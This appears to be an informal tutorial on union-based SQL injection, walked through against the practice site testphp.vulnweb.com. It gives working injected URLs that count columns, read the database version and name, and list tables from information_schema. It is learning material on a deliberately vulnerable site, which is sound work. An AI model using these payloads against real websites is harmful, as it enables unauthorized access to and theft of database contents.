Union Based SQLi

Practice webpage: http://testphp.vulnweb.com/


at page: http://testphp.vulnweb.com/artists.php?artist=2

we can see an artist information from SQL database and he has an id of 2.

let's try to set id part: artist=2-1

And we receive data from id 1.

if we try:
http://testphp.vulnweb.com/artists.php?artist=2 AND 1=2

it return us null/empty page (that is what we expect too, because 1 = 2 is False)

let's try UNION in our url and put SELECT 1. When we get error we need to add 1 number every time.

http://testphp.vulnweb.com/listproducts.php?cat=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11

and we receive the injection at 11.


At the bottom of the page we can see an other section of data with the values: 2, 7 and 9. 
That means the webpage fetch data from sql and get these 3 values from database.

if we ask the database version at row 7 like this

http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201,2,3,4,5,6,version(),8,9,10,11

we will receive the version information at that position. We can also find the database name by replacing version()
to database()

But we want only see our data and not the other categories so for that we will add: cat=-999999
To not receive the other datas and only our injection data.



When we search how to find the tables names at stack overflow we find this url:

https://stackoverflow.com/questions/3913620/get-all-table-names-of-a-particular-database-by-sql-query

It gives us:

SELECT TABLE_NAME
FROM INFORMATION_SCHEMA.TABLES
WHERE TABLE_TYPE = 'BASE TABLE' AND TABLE_CATALOG='dbName'

so we use that:

http://testphp.vulnweb.com/listproducts.php?cat=-999999%20UNION%20SELECT%201,table_name,3,4,5,6,7,8,9,10,11%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20database()

and we receive all the avaible tables in this database. Then we can start getting datas by using SELECT FROM etc.
